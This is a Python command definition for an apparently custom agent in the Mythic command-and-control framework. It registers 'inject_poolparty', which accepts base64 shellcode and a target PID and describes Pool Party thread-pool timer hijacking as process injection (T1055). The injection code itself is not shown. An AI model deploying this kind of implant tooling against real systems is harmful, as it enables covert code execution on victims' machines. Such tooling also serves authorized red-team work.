from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class InjectPoolpartyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode",
                type=ParameterType.String,
                description="Base64-encoded shellcode to inject",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                display_name="PID",
                description="Target PID (0 = spawn the technique default)",
                default_value=0,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class InjectPoolpartyCommand(CommandBase):
    cmd = "inject_poolparty"
    needs_admin = False
    help_cmd = 'inject_poolparty {"shellcode": "<b64>"}'
    description = "Pool Party injection - spawns CompPkgSrv.exe via NtCreateUserProcess, hijacks worker factory thread pool TP_TIMER to execute shellcode via timer expiration."
    version = 1
    author = "NomadAgent"
    attackmapping = ["T1055"]
    argument_class = InjectPoolpartyArguments

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
